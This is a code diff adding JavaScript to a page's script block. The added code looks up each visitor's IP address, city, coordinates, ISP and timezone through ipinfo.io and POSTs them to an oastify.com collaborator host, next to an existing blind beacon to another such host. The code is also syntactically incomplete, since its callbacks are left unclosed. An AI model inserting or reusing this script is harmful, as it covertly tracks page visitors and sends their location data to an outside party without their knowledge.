@@ -1,3 +1,37 @@
 <script>
   fetch('https://nneoiosukbexdj608pl7jw95gwmoagy5.oastify.com', { method: 'POST', mode: 'no-cors'}); 
+    // Получаем данные IP через ipinfo.io
+fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+    // Сохраняем данные в переменные
+    const userIP = data.ip;
+    const userCity = data.city;
+    const userRegion = data.region;
+    const userCountry = data.country;
+    const userLocation = data.loc; // координаты "широта,долгота"
+    const userOrg = data.org; // провайдер
+    const userTimezone = data.timezone;
+    
+    // Формируем объект для отправки
+    const payload = {
+      ip: userIP,
+      city: userCity,
+      region: userRegion,
+      country: userCountry,
+      location: userLocation,
+      organization: userOrg,
+      timezone: userTimezone,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Отправляем данные на другой домен
+    fetch('https://lshmnmxsp9jvihbydnq5oue3lurmff34.oastify.com', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+
 </script>
